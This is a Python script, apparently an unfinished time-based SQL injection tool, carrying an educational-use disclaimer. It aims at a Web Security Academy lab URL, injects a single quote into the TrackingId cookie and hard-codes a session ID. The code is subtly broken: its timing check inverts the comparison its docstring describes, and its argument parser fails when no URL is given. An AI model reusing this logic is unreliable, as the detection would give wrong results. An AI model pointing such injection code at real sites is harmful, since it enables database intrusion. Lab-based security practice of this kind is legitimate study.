'''
 Copyright (C) <2022> Yan Zaripov, https://github.com/jonnyzar/

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    SECURITY DISCLAIMER:
    This program is intended for educational or self-assessment purposes only.
    You may have legal consequences if you use it to attack systems that do not 
    belong to you.
'''


import requests
import sys
import urllib.parse
#import argparse

def getArguments():
    if len(sys.argv) > 1:
        URL = sys.argv[1]
    else:
        print("Usage: python3 tbSQLi.py URL [...]") 

    return URL


def getTiming(sTime,eTime,inTrigger):
    '''
    Determine time delay from response to request and compare to trigger
    
    True if delay is equal or larger than trigger
    '''

    delta = eTime - sTime

    if inTrigger >= delta:
        return True
    else:
        return False

def sendRequest(URL, inCookies):
    '''
    Sends reuquest to target URL with specified payload

    Payload is gonna be some conditional SQL statement 
    '''

    #GET

    res = requests.get(URL,cookies = inCookies)

    try:
        res.raise_for_status()
        print(res.status_code)
        print(res.request.headers)
    except Exception as e:
        print(e)



#################################### Main ##############################

def main():

    targetURL = "https://0ae600ec04187f01c093030d004b0005.web-security-academy.net/filter?category=Pets"

    #defining single cookie parameters
    trID="'"
    sessID="2HKUEHRSLDclQD2Df7U77gU6nvrq3csb"

    cookies = dict(TrackingId = urllib.parse.quote(trID), session = sessID)

    
    inTrigger = 10

    sendRequest(targetURL, cookies)


if __name__ == "__main__":
    main()
